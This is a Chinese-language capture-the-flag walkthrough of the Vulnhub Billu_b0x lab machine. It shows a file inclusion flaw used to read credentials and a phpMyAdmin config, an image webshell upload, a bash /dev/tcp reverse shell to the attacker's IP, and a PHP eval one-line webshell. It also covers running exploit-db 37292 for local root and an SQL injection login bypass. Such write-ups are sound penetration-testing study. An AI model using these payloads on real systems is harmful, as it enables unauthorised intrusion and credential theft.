---
title: Vulnhub-billub0x
---

# Vulnhub-billub0x

## 靶机信息

### 下载链接

[https://download.vulnhub.com/billu/Billu_b0x.zip](https://download.vulnhub.com/billu/Billu_b0x.zip)

### 靶机说明

虚拟机难度中等，使用ubuntu（32位）,其他软件包有：PHP、apache、MySQL

### 目标

Boot to root：从Web应用程序进入虚拟机，并获得root权限。

### 运行环境

靶机：网络连接方式设置为net，靶机自动获取IP。
攻击机：Windows10攻击机，kali攻击机，主要用Windows攻击机完成实验。

## 信息收集

### 目标发现

启动Billu_b0x虚拟机，由于虚机网络设置为net模式，使用Nmap扫描vm8网卡的NAT网段C段IP，命令：`nmap -sP 192.168.64.1/24`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-1.png)

成功得到靶机ip：192.168.160.187

### 端口和服务识别

nmap扫描

```shell
#扫描1-65535全端口，并做服务识别和深度扫描（加-A参数），扫描结果保存到txt文件
nmap -p1-65535 -A 192.168.64.161 -oN billu.txt
```

扫描发现开启了22（SSH OpenSSH 5.9p1）和80端口（ HTTP Apache httpd 2.2.22）

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-2.png)

访问80端口：发现用户名密码输入框，并提示`Show me your SQLI skills`，好家伙这是要我sql注入呀，我直接一波操作猛如虎，干了半个小时，手工加sqlmap跑了半天，没有结果，先放着。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-3.png)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-4.png)

### 目录扫描

#### dirb

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-5.png)

#### 御剑目录扫描

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-6.png)

好家伙，目录很多，挨个访问

#### 手工探测

in.php,这是一个phpinfo的界面，发现敏感信息：网站绝对路径/var/www

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-7.png)

allow_url_fopen = on

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-34.png)

c.php,返回为空白

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-9.png)

test.php,这里报错要我指定file，再结合之前phpinfo的敏感信息，说明这里有可能存在文件包含漏洞

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-8.png)

add.php,一个文件上传界面，这里F12 看源码，发现只有前端，无后端交互源码，说明这里是一个摆设，无用。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-10.png)

/phpmy,这里是个phpmyadmin的界面，尝试弱口令，失败，先放着。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-33.png)

## 渗透阶段

### 思路一：文件包含查看配置文件，获取root密码

通过前面的信息收集可知test.php页面可能存在文件包含漏洞，首先通过get方式输入参数，并没有什么反应。尝试POST方式，成功读取/etc/passwd。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-11.png)

但是无法读取/etc/shadow

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-12.png)

尝试读取其他的目录文件，并审计源码

上面目录扫描发现phpmyadmin,以及phpinfo中发现的网站绝对路径，这里尝试读取phpmyadmin的默认配置文件config.inc.php

file=/var/www/phpmy/config.inc.php,成功读取，发现root用户密码为`roottoor`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-15.png)

用上面的密码，ssh远程连接，成功，就这？？？？

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-16.png)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-17.png)

### 思路二：文件包含+文件上传获取shell。

1、读取c.php，发现mysql用户密码：b0bill:ux_billu

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-13.png)

到先前发现的/phpmy目录进行登录，登陆成功并发现auth表中的一个用户密码biLLu:hEx_it，到首页进行登录

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-14.png)

2、登录成功后，点击show user,这是查看账号页面，F12查看现有图片路径

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-37.png)

并成功访问

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-38.png)

点击add user进入添加账号界面，这是一个文件上传点，简单尝试发现这里上传的文件在上面的路径里

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-18.png)

尝试上传一句话木马，发现为白名单过滤

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-19.png)

尝试上传图片马，然后用文件包含去解析，因为这里是POST 方式，所以不能用中国蚁剑直接连，这里只能写一个命令马，然后用burp以POST方式执行。（命令马：直接将一句话用文本编辑器写在图片的中间或者后面）![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-21.png)

3、在test.php,页面进行解析，发现解析失败，查看源码发现这里是下载，而不能成功解析。

通过test.php的文件包含漏洞，进一步查看各个页面源码寻找突破点，在/panel.php发现在continue那也存在文件包含漏洞(功夫不负有心人)。![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-20.png)

根据上面发现的路径，的出上传的命令马的路径为/uploaded_images/1.jpg，利用上面的文件包含漏洞进行解析并成功执行命令

POST请求url中加入执行命令的参数：`POST /panel.php?cmd=ls`

POST的body中包含1.jpg图片马：`load=/uploaded_images/1.jpg&continue=continue`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-22.png)

用bash反弹shell`echo "bash -i >& /dev/tcp/192.168.160.129/4444 0>&1" | bash`需要将命令url编码然后发送

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-23.png)

编码完成后，在开启nc监听`nc -lvnp 4444`,然后再POST发送命令

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-24.png)

nc接收反弹shell成功

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-25.png)

找一个可写权限目录，写入一句话木马，以便蚁剑连接，方便提权exp文件的上传

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-26.png)

文件上传目录`uploaded_images`为写权限目录，进入该目录，写一个一句话木马：`echo '<?php eval()$_POST[aaa]);?>' >> 1.php`

蚁剑连接成功。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-27.png)

下载Ubuntu著名的本地提权漏洞exp：[https://www.exploit-db.com/exploits/37292/](https://www.exploit-db.com/exploits/37292/)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-28.png)

下载完后用蚁剑上传至目标机可写目录`uploaded_images`,

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-29.png)

上传成功

```shell
#赋予执行权限
chmod 777 37292.c
#编译exp
gcc 37292.c -o exp
#执行exp，提权至root
./exp
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-30.png)

提权成功

### 思路三：构造注入

回到之前信息收集中的注入页面，也就是首页index.php,利用发现的文件包含漏洞，查看源码中过滤sql的方法，针对性构造sql注入

1、审计index.php源码，发现以下过滤规则：

```php
$uname=str_replace('\'','',urldecode($_POST['un']));
$pass=str_replace('\'','',urldecode($_POST['ps']));
```

str_replace的作用是将字符串\' 替换为空，因此构造SQL注入登录payload时，必须含有\'字符串，否则会报错。urldecode的作用是将输入解码。

2、 常见的利用注入登录的payload是' or 1=1 -- 修改这个在最后增加\'，str_replace会将这个\'替换为空。

3、注入成功，payload是`' or 1=1 -- \'`；后面获取shell方法和上面实验相同。

